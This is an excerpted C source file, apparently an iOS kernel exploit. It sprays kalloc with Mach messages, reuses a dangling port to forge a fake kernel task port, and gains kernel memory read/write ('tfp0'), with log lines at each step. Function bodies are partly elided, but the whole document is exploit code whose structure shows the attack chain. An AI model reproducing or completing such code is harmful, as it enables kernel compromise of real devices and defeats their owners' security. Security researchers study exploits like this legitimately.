...
void prepare_user_client() {
  ...
  if (service == IO_OBJECT_NULL){
    textLog(" [-] unable to find service\n");
    exit(EXIT_FAILURE);
  }
  
  err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
  if (err != KERN_SUCCESS){
    textLog(" [-] unable to get user client connection\n");
    exit(EXIT_FAILURE);
  }
	
	
  textLog("got user client: 0x%x\n", user_client);
}
...
mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replacer_body_size) {
  ...
  if (err != KERN_SUCCESS) {
    textLog(" [-] failed to increase queue limit\n");
    exit(EXIT_FAILURE);
  }
  ...
  for (int i = 0; i < 256; i++) { // was MACH_PORT_QLIMIT_LARGE
    ...
    if (err != KERN_SUCCESS) {
      textLog(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
      exit(EXIT_FAILURE);
    }
  }
...
uint8_t* build_message_payload(uint64_t dangling_port_address, uint32_t message_body_size, uint32_t message_body_offset, uint64_t vm_map, uint64_t receiver, uint64_t** context_ptr) {
  ...
  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_address;
  ...
  if (fake_port + fake_task_offset < body) {
    textLog("the maths is wrong somewhere, fake task doesn't fit in message\n");
    sleep(10);
    exit(EXIT_FAILURE);
  }
...
mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
  ...
  if (err != KERN_SUCCESS) {
    textLog("unable to allocate port\n");
  }
  ...
  textLog("fake_kernel_task_kaddr: %llx\n", fake_kernel_task_kaddr);
  ...
  *(uint8_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
  ...
  textLog("read fake_task_refs: %x\n", fake_task_refs);
  if (fake_task_refs != 0xd00d) {
    textLog("read back value didn't match...\n");
  }
...
uint64_t find_kernel_vm_map(uint64_t task_self_addr) {
  ...
  textLog("unable to find kernel task...\n");
  sleep(10);
  exit(EXIT_FAILURE);
}
...
mach_port_t get_kernel_memory_rw() {
  ...
  textLog("message size for kalloc.4096: %d\n", message_size_for_kalloc_size(4096));
  ...
  if (task_self == 0) {
    textLog("unable to disclose address of our task port\n");
    sleep(10);
    exit(EXIT_FAILURE);
  }
  textLog("our task port is at 0x%llx\n", task_self);
  ...
  for (int i = 0; i < ports_to_test; i++) {
    ...
    if (page_offset > 0xa00 && page_offset < 0xe80) { // this range could be wider but there's no need
      textLog("found target port with suitable allocation page offset: 0x%016llx\n", candidate_address);
  ...
  if (first_port == MACH_PORT_NULL) {
    textLog("unable to find a candidate port with a suitable page offset\n");
    exit(EXIT_FAILURE);
  }
  ...
  textLog("replacer_body_size: 0x%x\n", replacer_body_size);
  textLog("message_body_offset: 0x%x\n", message_body_offset);
  ...
  textLog("second time got replaced with replacer port %ld\n", replacer_port_number);
  ...
  textLog("will try to read from second port (fake kernel)\n");
  ...
  textLog("kernel read via fake kernel task port worked?\n");
  textLog("0x%016llx\n", *(uint64_t*)data_out);
  textLog("0x%016llx\n", *(uint64_t*)(data_out+8));
  textLog("0x%016llx\n", *(uint64_t*)(data_out+0x10));
  textLog("0x%016llx\n", *(uint64_t*)(data_out+0x18));
  ...
  textLog("about to build safer tfp0\n");
  ...
  textLog("built safer tfp0\n");
  textLog("about to clear up\n");
...
//
//	textLog("IOSurfaceRootUserClient_vtab: %016llx\n", IOSurfaceRootUserClient_vtab);
//	textLog("IOSurfaceRootUserClient_vtab[0]: %016llx\n", rk64(IOSurfaceRootUserClient_vtab));
//	textLog("starting assembly of IOSurfaceRootUserClient_vtab[0]: %016llx\n", rk64(rk64(IOSurfaceRootUserClient_vtab)));
//
